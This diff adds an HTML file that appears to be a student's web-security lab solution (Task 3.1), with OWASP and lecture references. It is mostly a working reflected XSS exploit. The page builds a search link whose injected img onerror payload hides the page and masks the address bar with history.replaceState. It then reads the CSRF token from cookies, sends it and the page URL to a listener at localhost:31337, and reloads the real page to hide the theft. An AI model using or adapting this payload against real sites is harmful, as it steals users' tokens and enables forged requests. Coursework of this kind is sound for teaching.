@@ -1,0 +1,112 @@
+<!--
+COLLABORATORS: N/A
+REFERENCES:
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html,
+- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+- XSS Lecture Slides
+- https://html.spec.whatwg.org/multipage/nav-history-apis.html#the-history-interface
+-->
+
+<html>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+    // // This code is ran once URL is clicked
+    // function payload(attacker) {
+    //     // Hide the sus url
+    //     $("html").hide();
+        
+    //     // Changes the url to the original URL
+    //     history.replaceState(null, '', 'http://localhost/project2/');
+        
+    //     // Gets the CSRF token
+    //     function getCSRFToken() {
+    //         var n = 'csrf=';
+    //         var d = decodeURIComponent(document.cookie);
+    //         var c = d.split(';');
+    //         for(var i = 0; i < c.length; i++) {
+    //             var x = c[i];
+    //             while(x.charAt(0) == ' ') {
+    //                 x = x.substring(1);
+    //             }
+    //             if(x.indexOf(n) == 0) {
+    //                 return x.substring(n.length, x.length);
+    //             }
+    //         }
+    //         return '';
+    //     }
+        
+    //     // Send data to netcat
+    //     function log(data) {
+    //         $.get(attacker, data);
+    //     }
+        
+    //     var token = getCSRFToken();
+    //     log({
+    //         event: 'page_load',
+    //         uri: window.location.href,
+    //         csrf: token
+    //         xssdefense: 1,
+    //         csrfdefense: 0
+    //     });
+        
+    //     // Load the main page
+    //     $("html").load("./", function() {
+    //         $("html").show();
+    //     });
+    // }
+
+    function makeLink(csrfdefense, xssdefense, target, attacker) {
+        if (xssdefense == 0) {
+            return target + "./search?xssdefense=" + xssdefense.toString() +
+                "&csrfdefense=" + csrfdefense.toString() + "&q=" +
+                encodeURIComponent("<script" + ">" + payload.toString() +
+                    ";payload(\"" + attacker + "\");</script" + ">");
+        } else {
+            // Turn the payload function into a string.
+            var payloadStr = 
+                "$('html').hide();" +
+                "history.replaceState(null,'','http://localhost/project2/');" +
+                "function getCSRFToken(){" +
+                "var n='csrf=';" +
+                "var d=decodeURIComponent(document.cookie);" +
+                "var c=d.split(';');" +
+                "for(var i=0;i<c.length;i++){" +
+                "var x=c[i];" +
+                "while(x.charAt(0)==' '){x=x.substring(1)}" +
+                "if(x.indexOf(n)==0){return x.substring(n.length,x.length)}" +
+                "}" +
+                "return''}" +
+                "var token=getCSRFToken();" +
+                "$.get('" + attacker + "',{" +
+                "event:'page_load'," +
+                "uri:window.location.href," +
+                "csrf:token," +
+                "xssdefense:1," +
+                "csrfdefense:0" +
+                "});" +
+                "$('html').load('./',function(){$('html').show()});";
+            
+            var imgTag = "<img src=x onerror=\"" + payloadStr + "\">";
+            var encodedImgTag = encodeURIComponent(imgTag);
+            
+            return target + "./search?xssdefense=" + xssdefense.toString() +
+                "&csrfdefense=" + csrfdefense.toString() + "&q=" + encodedImgTag;
+        }
+    }
+
+    var csrfdefense = 0;
+    var xssdefense = 1;
+    var target = "http://localhost/project2/";
+    var attacker = "http://localhost:31337/";
+    
+    $(function() {
+        var url = makeLink(csrfdefense, xssdefense, target, attacker);
+        $("h3").html("<a target=\"run\" href=\"" + url + "\">Task 3.1</a>");
+    });
+</script>
+
+<body class="link">
+    <h3></h3>
+</body>
+</html>
